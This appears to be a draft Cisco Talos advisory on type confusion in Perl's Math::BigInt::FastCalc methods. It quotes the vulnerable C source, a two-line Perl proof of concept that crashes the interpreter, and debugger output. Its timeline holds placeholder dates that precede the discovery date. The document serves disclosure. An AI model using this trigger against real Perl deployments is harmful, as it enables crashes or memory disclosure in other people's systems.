Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Perl CPAN Math-BigInt-FastCall module multiple type confusion vulnerabilities.

:: Description

Type Confusion exists in multiple methods of Math::BigInt::FastCal package. This is :
Math::BigInt::FastCalc::_copy
Math::BigInt::FastCalc::__strip_zeros
Math::BigInt::FastCalc::_dec
Math::BigInt::FastCalc::_inc
Math::BigInt::FastCalc::_is_even
Math::BigInt::FastCalc::_is_odd
Math::BigInt::FastCalc::_is_one
Math::BigInt::FastCalc::_is_ten
Math::BigInt::FastCalc::_is_two
Math::BigInt::FastCalc::_is_zero
Math::BigInt::FastCalc::_len
Math::BigInt::FastCalc::_acmp

Attacker passing different type of object than this assumed by developers can cause arbitrary code execution or memory disclosure.

:: Tested Versions

Perl (v5.23.3) built for MSWin32-x86-multi-thread

:: Product URLs

https://www.perl.org/


:: Description

In all methods mentioned in description type confusion vulnerablity appears about which developers seems to be aweare of 
what is indicated by comment in vulnerable line.

Vulnerable line common for all methods

---------------------------------- cpan\Math-BigInt-FastCalc\FastCalc.c ----------------------------------------
Line 520		if (items != 2)
Line 521		   croak_xs_usage(cv,  "class, x");
Line 522		{
Line 523		SV*	x = ST(1)
Line 524	;
Line 525	#line 328 "FastCalc.xs"
Line 526		AV*	a;
Line 527		SV*	temp;
Line 528		IV	elems;
Line 529		STRLEN len;
Line 530
Line 531	#line 532 "FastCalc.c"
Line 532	#line 334 "FastCalc.xs"
Line 533		a = (AV*)SvRV(x);			/* ref to aray, don't check ref */

---------------------------------- cpan\Math-BigInt-FastCalc\FastCalc.c ----------------------------------------

in Line 533 we see x variable which suppose to be a reference to array type is dereferenced without previos check whether variable is indded a reference
and what type of object it references on.

:: PoC

---------------------------------- PoC test.rb ----------------------------------------

use Math::BigInt::FastCalc;
Math::BigInt::FastCalc->_inc(0x11223344);
---------------------------------- PoC test.rb ----------------------------------------

:: Debugger analysis
FAULTING_IP: 
perl523!S_av_top_index+7 [t:\projects\bugs\perl5\inline.h @ 23]
77d680f7 8b4808          mov     ecx,dword ptr [eax+8]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 77d680f7 (perl523!S_av_top_index+0x00000007)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 1122334c
Attempt to read from address 1122334c

FAULTING_THREAD:  00002b60

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  perl.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  1122334c

READ_ADDRESS:  1122334c 

FOLLOWUP_IP: 
perl523!S_av_top_index+7 [t:\projects\bugs\perl5\inline.h @ 23]
77d680f7 8b4808          mov     ecx,dword ptr [eax+8]

DETOURED_IMAGE: 1

APP:  perl.exe

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 77d676b0 to 77d680f7

STACK_TEXT:  
0017f568 77d676b0 052ce53c 11223344 0017f5d4 perl523!S_av_top_index+0x7
0017f578 73151998 052ce53c 11223344 052ce53c perl523!Perl_av_len+0x10
0017f5d4 77e4a37a 052ce53c 0e3517fc 77ee9b86 FastCalc!XS_Math__BigInt__FastCalc__inc+0x88
0017f740 77ee8ffb 052ce53c 00000000 0d25d7c4 perl523!Perl_pp_entersub+0x125a
0017f754 77dff60a 052ce53c 00000001 0017f7e0 perl523!Perl_runops_standard+0x1b
0017f764 77dfbb9e 052ce53c 00000001 00000001 perl523!S_run_body+0x1ba
0017f7e0 77f74c5b 052ce53c 02bc6fbc 00000000 perl523!perl_run+0x8e
0017fa10 01351036 00000002 02bc6fb0 06df4f18 perl523!RunPerl+0x13b
0017fa28 01351256 00000002 02bc6fb0 06eccf18 perl!main+0x26
0017fa68 76b0336a 7efde000 0017fab4 77069882 perl!__tmainCRTStartup+0xfd
0017fa74 77069882 7efde000 7d0ba8de 00000000 kernel32!BaseThreadInitThunk+0xe
0017fab4 77069855 01351304 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
0017facc 00000000 01351304 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


FAULTING_SOURCE_LINE:  t:\projects\bugs\perl5\inline.h

FAULTING_SOURCE_FILE:  t:\projects\bugs\perl5\inline.h

FAULTING_SOURCE_LINE_NUMBER:  23

FAULTING_SOURCE_CODE:  
    19: {
    20:     PERL_ARGS_ASSERT_AV_TOP_INDEX;
    21:     assert(SvTYPE(av) == SVt_PVAV);
    22: 
>   23:     return AvFILL(av);
    24: }
    25: 
    26: /* ------------------------------- cv.h ------------------------------- */
    27: 
    28: PERL_STATIC_INLINE GV *


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  perl523!S_av_top_index+7

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: perl523

IMAGE_NAME:  perl523.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  55f1a9ae

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_c0000005_perl523.dll!S_av_top_index

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_DETOURED_perl523!S_av_top_index+7

Followup: MachineOwner
---------

0:000> .frame 2
02 0017f5d4 77e4a37a FastCalc!XS_Math__BigInt__FastCalc__inc+0x88 [t:\projects\bugs\perl5\cpan\math-bigint-fastcalc\fastcalc.xs @ 242]

  CODE:
    a = (AV*)SvRV(x);			/* ref to aray, don't check ref */
    elems = av_len(a);			/* number of elems in array */
---------

:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Cisco TALOS.

:: Timeline

2015-09-24 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure